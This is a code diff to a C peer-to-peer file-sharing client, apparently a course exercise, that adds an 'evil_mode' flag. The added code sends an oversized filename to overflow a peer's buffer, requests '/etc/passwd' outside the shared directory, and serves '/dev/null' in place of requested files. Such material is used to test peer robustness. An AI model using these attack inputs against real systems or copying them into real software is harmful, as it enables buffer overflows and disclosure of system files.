@@ -23,7 +23,7 @@
 #include "md5.h"
 #include "osp2p.h"
 
-int evil_mode;			// nonzero iff this peer should behave badly
+int evil_mode = 0;			// nonzero iff this peer should behave badly
 
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
@@ -551,6 +551,13 @@ static void task_download_r(task_t *t, task_t *tracker_task, int iter)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	if(evil_mode == 1){ //overload buffers: filename size of 255
+		strcpy(t->filename, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx255");
+	}
+	else if(evil_mode == 3){ //asks for a file that is not in current directory
+		strcpy(t->filename, "/etc/passwd");
+	}
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -699,9 +706,15 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 
-	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
-		error("* Odd request %.*s\n", t->tail, t->buf);
-		goto exit;
+	//send peer a file that they did not request
+	if(evil_mode == 2){
+		strcpy(t->filename, "/dev/null");
+	} 
+	else {
+		if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
+			error("* Odd request %.*s\n", t->tail, t->buf);
+			goto exit;
+		}
 	}
 	t->head = t->tail = 0;
 	
